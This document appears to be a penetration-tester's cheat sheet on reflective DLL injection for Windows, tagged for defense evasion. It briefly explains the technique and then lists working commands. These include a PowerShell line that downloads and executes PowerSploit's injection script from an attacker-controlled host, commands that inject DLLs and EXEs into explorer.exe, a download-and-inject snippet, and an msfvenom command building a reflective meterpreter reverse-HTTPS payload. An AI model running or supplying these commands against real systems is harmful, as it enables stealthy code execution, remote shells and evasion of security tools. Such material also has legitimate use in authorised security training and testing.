---
tags:
  - Advanced
  - Code_Injection
  - DLL_Injection
  - Defense_Evasion
  - Reflective_Loading
  - Windows
---

## Reflective DLL Injection
resources: [Reflective DLL Injection - Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection)

> [!tip] DLL loads itself into memory without using **LoadLibrary**. Avoids disk writes and standard DLL loading APIs. DLL contains its own loader.

### Theory

#### Key Differences from Standard DLL Injection
> - **Standard** - Uses LoadLibrary, DLL must exist on disk, easy to detect
> - **Reflective** - DLL contains custom loader, can load from memory, no disk write required

#### Reflective Injection Flow
> [!tip] Injection sequence:
> 1. Allocate memory in target process
> 2. Write entire DLL (not just path) to allocated memory
> 3. Calculate offset to reflective loader function in DLL
> 4. Create remote thread pointing to reflective loader
> 5. Reflective loader manually maps DLL, resolves imports, calls DllMain

#### Required Components
> [!important] Key components:
> - **Reflective Loader** - Function in DLL that performs manual mapping
> - **Position Independent Code** - Loader must work regardless of load address
> - **Import Resolution** - Manually resolve GetProcAddress, LoadLibrary, etc.

### PowerShell Injection

#### Using Invoke-ReflectivePEInjection
> [!tip] **PowerSploit** module for reflective injection.

```powershell
# Load module
IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Invoke-ReflectivePEInjection.ps1')
```

#### Inject DLL into Remote Process
```powershell
# Read DLL bytes
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\reflective.dll")

# Inject into explorer.exe
$proc = Get-Process explorer
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id
```

#### Inject DLL into Current Process
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\reflective.dll")
Invoke-ReflectivePEInjection -PEBytes $bytes
```

#### Inject EXE into Memory
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\payload.exe")
Invoke-ReflectivePEInjection -PEBytes $bytes -ExeArgs "arg1 arg2"
```

#### Download and Inject [alternative]
```powershell
$wc = New-Object Net.WebClient
$bytes = $wc.DownloadData("http://<AttackerIP>/reflective.dll")
$proc = Get-Process explorer
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id
```

### Generate Reflective DLL [Local]

#### msfvenom Reflective DLL
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll_reflect -o reflective.dll
```

#### Compile Custom Reflective DLL
> [!tip] Use **ReflectiveDLLInjection** project template with custom payload.

```bash
# Clone framework
git clone https://github.com/stephenfewer/ReflectiveDLLInjection

# Add payload to dll/src/ReflectiveDll.c
# Compile with Visual Studio
```
